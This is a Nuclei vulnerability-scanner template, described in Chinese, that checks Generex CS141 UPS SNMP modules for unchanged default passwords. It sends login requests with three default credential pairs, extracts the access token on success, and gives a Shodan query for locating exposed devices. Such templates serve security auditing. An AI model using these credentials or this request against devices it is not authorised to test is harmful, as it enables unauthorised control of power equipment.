id: cs141-default-login

info:
  name: UPS Adapter CS141 SNMP Module 默认口令登录（弱口令）
  author: socketz
  severity: medium
  description: 该模板通过尝试 UPS Adapter CS141 SNMP Module 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:h:generex:cs141:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    shodan-query: http.html:"CS141"
    product: cs141
    vendor: generex
  tags: hiawatha,iot,default-login,vuln

http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Content-Type: application/json

        {"userName":"{{user}}","password":"{{pass}}"}

    attack: pitchfork
    payloads:
      user:
        - admin
        - engineer
        - guest
      pass:
        - cs141-snmp
        - engineer
        - guest
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'accessToken'
          - 'application/json'
        condition: and
        part: header

      - type: word
        part: body
        words:
          - 'accessToken'
          - 'AdminFirstTime'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: kval
        kval:
          - accessToken
